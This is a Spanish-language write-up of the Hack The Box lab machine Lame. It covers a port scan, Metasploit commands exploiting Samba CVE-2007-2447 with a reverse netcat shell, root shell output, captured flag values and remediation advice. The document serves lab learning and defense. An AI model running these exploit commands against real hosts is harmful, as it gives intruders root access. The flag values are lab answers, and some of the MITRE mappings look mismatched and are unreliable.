# REPORTE DE EXPLOTACIÓN - MÁQUINA LAME (Hack The Box)

## Resumen Ejecutivo

| Campo | Valor |
|-------|-------|
| **Objetivo** | Lame (10.129.70.3) |
| **Vulnerabilidad Explotada** | CVE-2007-2447 (Samba usermap_script) |
| **Privilegio Obtenido** | **ROOT (uid=0)** |
| **Flags Obtenidas** | user.txt ✅ root.txt ✅ |

---

## Fase 1: Reconocimiento

### Escaneo de Puertos (Nmap)
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

### Servicios Identificados
- **FTP**: vsftpd 2.3.4 con login anónimo permitido
- **SSH**: OpenSSH 4.7p1
- **SMB**: Samba 3.0.20-Debian (VULNERABLE a CVE-2007-2447)

---

## Fase 2: Explotación

### Vulnerabilidad: CVE-2007-2447 (Samba usermap_script)
- **Affected**: Samba 3.0.20 - 3.0.25rc3
- **Type**: Command Injection via username map script
- **CVSS**: 9.8 (Critical)

### Comando de Explotación (Metasploit)
```
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.70.3
set LHOST 10.10.14.194
set PAYLOAD cmd/unix/reverse_netcat
exploit
```

### Resultado
```
[*] Command shell session 1 opened (10.10.14.194:4444 -> 10.129.70.3:56816)
uid=0(root) gid=0(root)
```

---

## Fase 3: Post-Explotación - Flags

### User Flag
```
Ubicación: /home/makis/user.txt
Flag: 73e6b28fe14ce02a92776440dcf5b2a2
```

### Root Flag
```
Ubicación: /root/root.txt
Flag: 40cb385f7d6863a695b7d57d23ec5584
```

---

## Usuarios del Sistema

| Usuario | UID | Home |
|---------|-----|------|
| root | 0 | /root |
| makis | 1003 | /home/makis |
| service | 1002 | /home/service |

---

## MITRE ATT&CK Mapping

| Táctica | Técnica | ID |
|---------|---------|-----|
| Reconocimiento | Active Scanning: port scan | T1046 |
| Explotación | Exploitation of Remote Services | T1210 |
| Acceso Initial | Exploitation for Client Execution | T1203 |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Acceso Credential | Unsecured Credentials | T1552 |

---

## Éxito del Ataque

| Objetivo | Estado |
|----------|--------|
| Acceso al sistema | Completado |
| Privilegio Root | Obtenido |
| user.txt | 73e6b28fe14ce02a92776440dcf5b2a2 |
| root.txt | 40cb385f7d6863a695b7d57d23ec5584 |

---

## Remediación (Para entornos reales)

1. **Actualizar Samba** a versión 3.0.25 o superior
2. **Deshabilitar** el map de usuarios vulnerable
3. **Aplicar parches** de seguridad del vendor
4. **Segmentar** la red para limitar acceso SMB
5. **Monitorear** intentos de explotación en logs de Samba
